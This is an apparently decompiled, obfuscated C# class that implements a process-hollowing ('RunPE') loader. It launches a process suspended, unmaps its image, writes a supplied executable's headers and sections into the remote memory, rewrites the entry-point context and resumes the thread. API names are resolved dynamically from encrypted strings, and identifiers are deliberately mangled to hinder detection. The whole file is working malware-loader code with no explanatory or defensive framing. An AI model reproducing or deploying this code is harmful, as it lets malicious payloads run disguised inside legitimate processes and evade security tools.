using System;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using ns9;

namespace ns3;

internal sealed class Class7
{
	public struct Struct0
	{
		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		public Struct1 struct1_0;

		public uint uint_7;

		public uint uint_8;

		public uint uint_9;

		public uint uint_10;

		public uint uint_11;

		public uint uint_12;

		public uint uint_13;

		public uint uint_14;

		public uint uint_15;

		public uint uint_16;

		public uint uint_17;

		public uint uint_18;

		public uint uint_19;

		public uint uint_20;

		public uint uint_21;

		public uint uint_22;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
		public byte[] byte_0;
	}

	public struct Struct1
	{
		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
		public byte[] byte_0;

		public uint uint_7;
	}

	public struct Struct2
	{
		public uint uint_0;

		public uint uint_1;
	}

	public struct Struct3
	{
		public byte byte_0;

		public Struct2 struct2_0;

		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		public uint uint_7;
	}

	public struct Struct4
	{
		public IntPtr intptr_0;

		public IntPtr intptr_1;

		public int int_0;

		public int int_1;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct Struct5
	{
		public int int_0;

		public string string_0;

		public string string_1;

		public string string_2;

		public int int_1;

		public int int_2;

		public int int_3;

		public int int_4;

		public int int_5;

		public int int_6;

		public int int_7;

		public int int_8;

		public short short_0;

		public short short_1;

		public int int_9;

		public int int_10;

		public int int_11;

		public int int_12;
	}

	public struct Struct6
	{
		public int int_0;

		public IntPtr intptr_0;

		public int int_1;
	}

	public struct Struct7
	{
		public ushort ushort_0;

		public ushort ushort_1;

		public ushort ushort_2;

		public ushort ushort_3;

		public ushort ushort_4;

		public ushort ushort_5;

		public ushort ushort_6;

		public ushort ushort_7;

		public ushort ushort_8;

		public ushort ushort_9;

		public ushort ushort_10;

		public ushort ushort_11;

		public ushort ushort_12;

		public ushort ushort_13;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public ushort[] ushort_14;

		public ushort ushort_15;

		public ushort ushort_16;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
		public ushort[] ushort_17;

		public int int_0;
	}

	public struct Struct8
	{
		public uint uint_0;

		public Struct9 struct9_0;

		public Struct10 struct10_0;
	}

	public struct Struct9
	{
		public ushort ushort_0;

		public ushort ushort_1;

		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public ushort ushort_2;

		public ushort ushort_3;
	}

	public struct Struct10
	{
		public ushort ushort_0;

		public byte byte_0;

		public byte byte_1;

		public uint uint_0;

		public uint uint_1;

		public uint uint_2;

		public uint uint_3;

		public uint uint_4;

		public uint uint_5;

		public uint uint_6;

		public uint uint_7;

		public uint uint_8;

		public ushort ushort_1;

		public ushort ushort_2;

		public ushort ushort_3;

		public ushort ushort_4;

		public ushort ushort_5;

		public ushort ushort_6;

		public uint uint_9;

		public uint uint_10;

		public uint uint_11;

		public uint uint_12;

		public ushort ushort_7;

		public ushort ushort_8;

		public uint uint_13;

		public uint uint_14;

		public uint uint_15;

		public uint uint_16;

		public uint uint_17;

		public uint uint_18;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
		public Struct11[] struct11_0;
	}

	public struct Struct11
	{
		public uint uint_0;

		public uint uint_1;
	}

	public delegate bool Delegate0(string string_0, string AADSD, ref Struct6 procDASDAS3ess, ref Struct6 threa3SA33A3d, bool inherSA33Ait, uint uint_0, IntPtr intptr_0, string curr3ASDASDent, [In] ref Struct5 struct5_0, out Struct4 infS33o);

	public delegate bool Delegate1(IntPtr proSDA3Acess, int addreSDSA3ss, byte[] bufDSA3ASfer, int sizSA3ASDASe, out int wriS3A3S3tten);

	public delegate int Delegate2(IntPtr intptr_0, int adSDA3ASdress, ref int buffeDAS3A3r, int int_0, ref int int_1);

	public delegate IntPtr Delegate3(IntPtr proceSA3ASDASss, int addreSA3AAEss, uint siDSA3ze, uint uint_0, uint proS3A3SAtect);

	public delegate long Delegate4(IntPtr proce3SADASss, int addrSADASDess);

	public delegate uint Delegate5(IntPtr threDSADSAad);

	public delegate bool Delegate6(IntPtr intptr_0, ref Struct0 conDSA3SADtext);

	public delegate bool Delegate7(IntPtr intptr_0, ref Struct0 coDAS3Entext);

	public static void smethod_0(byte[] byte_0, string string_0)
	{
		checked
		{
			Struct0 conDSA3SADtext = default(Struct0);
			Struct4 infS33o = default(Struct4);
			Struct5 struct5_ = default(Struct5);
			Struct6 procDASDAS3ess = default(Struct6);
			Struct6 threa3SA33A3d = default(Struct6);
			GCHandle gCHandle = default(GCHandle);
			IntPtr intPtr = default(IntPtr);
			int num = default(int);
			Struct7 @struct = default(Struct7);
			Struct7 struct2 = default(Struct7);
			string text = default(string);
			string text2 = default(string);
			string text3 = default(string);
			string text4 = default(string);
			string text5 = default(string);
			string text6 = default(string);
			string text7 = default(string);
			string text8 = default(string);
			string text9 = default(string);
			string text10 = default(string);
			string text11 = default(string);
			string text12 = default(string);
			Delegate0 @delegate = default(Delegate0);
			Delegate6 delegate2 = default(Delegate6);
			Delegate2 delegate3 = default(Delegate2);
			Delegate1 delegate4 = default(Delegate1);
			Delegate4 delegate5 = default(Delegate4);
			Delegate3 delegate6 = default(Delegate3);
			Delegate7 delegate7 = default(Delegate7);
			Delegate5 delegate8 = default(Delegate5);
			Struct8 struct3 = default(Struct8);
			Struct8 struct4 = default(Struct8);
			IntPtr intPtr2 = default(IntPtr);
			int buffeDAS3A3r = default(int);
			int int_ = default(int);
			uint num2 = default(uint);
			uint num3 = default(uint);
			long num4 = default(long);
			int num5 = default(int);
			int i = default(int);
			Struct3 struct5 = default(Struct3);
			Struct3 struct6 = default(Struct3);
			byte[] array = default(byte[]);
			int num6 = default(int);
			int j = default(int);
			byte[] bytes = default(byte[]);
			try
			{
				conDSA3SADtext = default(Struct0);
				infS33o = default(Struct4);
				struct5_ = default(Struct5);
				procDASDAS3ess = default(Struct6);
				threa3SA33A3d = default(Struct6);
				gCHandle = GCHandle.Alloc(byte_0, GCHandleType.Pinned);
				intPtr = gCHandle.AddrOfPinnedObject();
				num = intPtr.ToInt32();
				@struct = default(Struct7);
				object? obj = Marshal.PtrToStructure(gCHandle.AddrOfPinnedObject(), @struct.GetType());
				@struct = ((obj != null) ? ((Struct7)obj) : struct2);
				gCHandle.Free();
				text = Class15.smethod_0(948936);
				text2 = Class15.smethod_0(948949);
				text3 = Class15.smethod_0(948970);
				text4 = Class15.smethod_0(948995);
				text5 = Class15.smethod_0(949020);
				text6 = Class15.smethod_0(949045);
				text7 = Class15.smethod_0(949054);
				text8 = Class15.smethod_0(949067);
				text9 = Class15.smethod_0(949072);
				text10 = Class15.smethod_0(949097);
				text11 = Class15.smethod_0(949114);
				text12 = Class15.smethod_0(949123);
				@delegate = smethod_1<Delegate0>(text, text2);
				delegate2 = smethod_1<Delegate6>(text, text3);
				delegate3 = smethod_1<Delegate2>(text, text4);
				delegate4 = smethod_1<Delegate1>(text, text5);
				delegate5 = smethod_1<Delegate4>(text11, text12);
				delegate6 = smethod_1<Delegate3>(text, text8 + text7 + text6);
				delegate7 = smethod_1<Delegate7>(text, text9);
				delegate8 = smethod_1<Delegate5>(text, text10);
				struct3 = default(Struct8);
				intPtr = new IntPtr(num + @struct.int_0);
				object? obj2 = Marshal.PtrToStructure(intPtr, struct3.GetType());
				struct3 = ((obj2 != null) ? ((Struct8)obj2) : struct4);
				struct5_.int_0 = Strings.Len((object)struct5_);
				conDSA3SADtext.uint_0 = 65539u;
				if (unchecked(0 - (@delegate(null, string_0, ref procDASDAS3ess, ref threa3SA33A3d, inherSA33Ait: false, 4u, intPtr2, null, ref struct5_, out infS33o) ? 1 : 0)) == 0)
				{
					return;
				}
				delegate2(infS33o.intptr_1, ref conDSA3SADtext);
				Delegate2 delegate9 = delegate3;
				IntPtr intptr_ = infS33o.intptr_0;
				int adSDA3ASdress = (int)(unchecked((long)conDSA3SADtext.uint_13) + 8L);
				buffeDAS3A3r = 0;
				int_ = 0;
				delegate9(intptr_, adSDA3ASdress, ref buffeDAS3A3r, 4, ref int_);
				delegate5(infS33o.intptr_0, 0);
				num2 = (uint)(int)delegate6(infS33o.intptr_0, (int)struct3.struct10_0.uint_6, struct3.struct10_0.uint_10, 12288u, 4u);
				if (unchecked((long)num2) == 0L)
				{
					return;
				}
				Delegate1 delegate10 = delegate4;
				IntPtr intptr_2 = infS33o.intptr_0;
				int addreSDSA3ss = (int)num2;
				int sizSA3ASDASe = (int)struct3.struct10_0.uint_11;
				int_ = (int)num3;
				delegate10(intptr_2, addreSDSA3ss, byte_0, sizSA3ASDASe, out int_);
				num3 = (uint)int_;
				num4 = @struct.int_0 + 248;
				num5 = unchecked((int)struct3.struct9_0.ushort_1) - 1;
				for (i = 0; i <= num5; i++)
				{
					intPtr = new IntPtr(num + num4 + i * 40);
					object? obj3 = Marshal.PtrToStructure(intPtr, struct5.GetType());
					struct5 = ((obj3 != null) ? ((Struct3)obj3) : struct6);
					array = new byte[(int)struct5.uint_1 + 1];
					num6 = (int)(unchecked((long)struct5.uint_1) - 1L);
					for (j = 0; j <= num6; j++)
					{
						array[j] = byte_0[(int)(unchecked((long)struct5.uint_2) + unchecked((long)j))];
					}
					Delegate1 delegate11 = delegate4;
					IntPtr intptr_3 = infS33o.intptr_0;
					int addreSDSA3ss2 = (int)(num2 + struct5.uint_0);
					byte[] bufDSA3ASfer = array;
					int sizSA3ASDASe2 = (int)struct5.uint_1;
					int_ = (int)num3;
					delegate11(intptr_3, addreSDSA3ss2, bufDSA3ASfer, sizSA3ASDASe2, out int_);
					num3 = (uint)int_;
				}
				bytes = BitConverter.GetBytes(num2);
				Delegate1 delegate12 = delegate4;
				IntPtr intptr_4 = infS33o.intptr_0;
				int addreSDSA3ss3 = (int)(unchecked((long)conDSA3SADtext.uint_13) + 8L);
				byte[] bufDSA3ASfer2 = bytes;
				int_ = (int)num3;
				delegate12(intptr_4, addreSDSA3ss3, bufDSA3ASfer2, 4, out int_);
				num3 = (uint)int_;
				conDSA3SADtext.uint_16 = num2 + struct3.struct10_0.uint_3;
				delegate7(infS33o.intptr_1, ref conDSA3SADtext);
				delegate8(infS33o.intptr_1);
			}
			catch (Exception exception_)
			{
				Class38.smethod_11(exception_, new object[48]
				{
					text12, num, text10, text9, delegate2, num2, conDSA3SADtext, delegate4, delegate5, gCHandle,
					struct5, @delegate, delegate7, infS33o, @struct, num3, delegate6, num4, struct3, text6,
					text11, text, text2, text3, text8, text7, text5, text4, threa3SA33A3d, procDASDAS3ess,
					delegate8, struct5_, delegate3, bytes, i, array, j, intPtr, struct2, struct4,
					intPtr2, buffeDAS3A3r, int_, num5, struct6, num6, byte_0, string_0
				});
				throw;
			}
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

	private unsafe static T smethod_1<T>(object object_0, object object_1)
	{
		try
		{
			return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref *(string*)(&object_0)), ref *(string*)(&object_1)), typeof(T));
		}
		catch (Exception exception_)
		{
			T val = default(T);
			Class38.smethod_3(exception_, val, object_0, object_1);
			throw;
		}
	}
}
